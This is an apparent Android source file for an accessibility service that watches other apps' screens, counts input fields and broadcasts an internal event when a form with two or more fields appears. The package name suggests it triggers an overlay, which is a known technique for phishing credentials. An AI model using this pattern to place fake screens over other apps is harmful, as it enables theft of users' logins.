package com.stronghold.overlay

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class FormDetectorService : AccessibilityService() {

    private var lastTriggeredPackage: String? = null
    private var cooldown = false

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        try {
            if (event == null) return
            val packageName = event.packageName?.toString() ?: return
            if (packageName == this.packageName) return
            if (packageName == "com.android.systemui") return
            if (packageName.startsWith("com.android.launcher")) return

            val eventType = event.eventType
            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                if (packageName != lastTriggeredPackage && !cooldown) {
                    checkForFormAndTrigger(packageName)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error: ${e.message}")
        }
    }

    private fun checkForFormAndTrigger(packageName: String) {
        try {
            val rootNode = rootInActiveWindow ?: return
            val inputCount = countInputFields(rootNode, 0)
            try { rootNode.recycle() } catch (_: Exception) {}

            Log.d(TAG, "Package: $packageName, inputs: $inputCount")

            if (inputCount >= 2) {
                lastTriggeredPackage = packageName
                cooldown = true

                Log.d(TAG, "FORM TRIGGERED: $packageName")

                sendBroadcast(Intent(ACTION_FORM_DETECTED).apply {
                    putExtra(EXTRA_PACKAGE_NAME, packageName)
                    putExtra(EXTRA_FIELD_COUNT, inputCount)
                    setPackage(this@FormDetectorService.packageName)
                })

                android.os.Handler(mainLooper).postDelayed({
                    cooldown = false
                }, 15000)
            }
        } catch (e: Exception) {
            Log.e(TAG, "checkForForm error: ${e.message}")
        }
    }

    private fun countInputFields(node: AccessibilityNodeInfo, depth: Int): Int {
        if (depth > 20) return 0
        var count = 0
        try {
            val className = node.className?.toString() ?: ""
            val isEditable = node.isEditable
            val isTextView = className.contains("TextView") || className.contains("EditText")
            val isInput = isEditable || (isTextView && node.isFocusable)
            if (isInput) count++

            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                count += countInputFields(child, depth + 1)
                try { child.recycle() } catch (_: Exception) {}
            }
        } catch (_: Exception) {}
        return count
    }

    override fun onInterrupt() {}

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "FormDetectorService connected")
    }

    companion object {
        private const val TAG = "FormDetector"
        const val ACTION_FORM_DETECTED = "com.stronghold.FORM_DETECTED"
        const val EXTRA_PACKAGE_NAME = "package_name"
        const val EXTRA_FIELD_COUNT = "field_count"
    }
}
